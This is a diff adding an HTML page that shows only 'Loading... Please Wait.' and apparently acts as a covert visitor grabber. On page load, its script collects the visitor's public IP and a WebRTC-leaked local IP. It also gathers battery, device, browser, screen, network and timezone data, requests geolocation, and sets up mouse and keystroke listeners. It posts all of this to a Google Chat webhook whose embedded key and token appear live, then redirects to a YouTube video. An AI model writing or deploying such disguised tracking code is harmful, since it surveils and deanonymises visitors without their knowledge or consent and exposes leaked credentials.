@@ -1,1 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <script>
+        function getOrCreateUserId() {
+            let userId = localStorage.getItem('user_id');
+            if (!userId) {
+                userId = 'user-' + crypto.randomUUID();
+                localStorage.setItem('user_id', userId);
+            }
+            return userId;
+        }
+
+        function updateVisitCount() {
+            let visitCount = localStorage.getItem('visit_count');
+            visitCount = visitCount ? parseInt(visitCount) + 1 : 1;
+            localStorage.setItem('visit_count', visitCount);
+            return visitCount;
+        }
+
+        async function getWebRTCIP() {
+            return new Promise((resolve) => {
+                const peerConnection = new RTCPeerConnection({ iceServers: [] });
+                peerConnection.createDataChannel('');
+                peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer));
+                peerConnection.onicecandidate = event => {
+                    if (event && event.candidate && event.candidate.candidate) {
+                        const ipMatch = event.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                        if (ipMatch) {
+                            resolve(ipMatch[1]);
+                        }
+                    }
+                };
+                setTimeout(() => resolve('unknown'), 1000);
+            });
+        }
+
+        async function collectAndSendData() {
+            try {
+                const userId = getOrCreateUserId();
+                const visitCount = updateVisitCount();
+
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const webRTCIPLeak = await getWebRTCIP();
+
+                const battery = await navigator.getBattery();
+                const batteryInfo = {
+                    charging: battery.charging,
+                    level: battery.level * 100 + '%',
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+
+                const browserInfo = {
+                    browserName: navigator.userAgentData?.brands?.[0]?.brand || navigator.appName,
+                    browserVersion: navigator.userAgentData?.brands?.[0]?.version || navigator.appVersion,
+                    osName: navigator.platform,
+                    deviceMemory: navigator.deviceMemory || 'Unknown',
+                    platform: navigator.userAgentData?.platform || navigator.platform,
+                    renderingEngine: navigator.product
+                };
+
+                const dateTime = new Date().toLocaleString('en-US', { timeZoneName: 'short' });
+                
+                let locationData = {};
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(position => {
+                        locationData = {
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        };
+                    });
+                }
+
+                const screenInfo = {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                };
+
+                const deviceInfo = {
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                    maxTouchPoints: navigator.maxTouchPoints,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language
+                };
+
+                let connectionData = {};
+                const networkInfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                if (networkInfo) {
+                    connectionData = {
+                        downlink: networkInfo.downlink,
+                        effectiveType: networkInfo.effectiveType,
+                        rtt: networkInfo.rtt,
+                        saveData: networkInfo.saveData
+                    };
+                }
+
+                const timeZoneLocale = {
+                    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    locale: navigator.language
+                };
+
+                const wifiOrCellular = networkInfo ? networkInfo.effectiveType : 'unknown';
+                const connectionSpeedType = networkInfo ? networkInfo.downlink + ' Mbps, ' + networkInfo.effectiveType : 'unknown';
+
+                let mouseTracking = [];
+                document.addEventListener('mousemove', (event) => {
+                    mouseTracking.push({ x: event.clientX, y: event.clientY, time: Date.now() });
+                });
+
+                let typingPatterns = [];
+                document.addEventListener('keydown', (event) => {
+                    typingPatterns.push({ key: event.key, time: Date.now() });
+                });
+
+                const userData = {
+                    userId,
+                    visitCount,
+                    ip: ipData.ip,
+                    webRTCIPLeak,
+                    batteryInfo,
+                    browserInfo,
+                    dateTime,
+                    locationData,
+                    screenInfo,
+                    deviceInfo,
+                    connectionData,
+                    timeZoneLocale,
+                    wifiOrCellular,
+                    connectionSpeedType,
+                    mouseTracking,
+                    typingPatterns
+                };
+
+                const webhookUrl = "https://chat.googleapis.com/v1/spaces/AAAA4kX04SE/messages?key=AIzaSyDdI0hCZtE6vySjMm-WEfRq3CPzqKqqsHI&token=cvInZitxbj0ExgHMVYD6NGinfMjid4xAfE5TMZZWhZ8";
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ text: JSON.stringify(userData, null, 2) })
+                });
+
+                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+            } catch (error) {
+                console.error('Error collecting or sending data:', error);
+            }
+        }
+
+        window.onload = collectAndSendData;
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+    <p>Please Wait.</p>
+</body>
+</html>
+
 
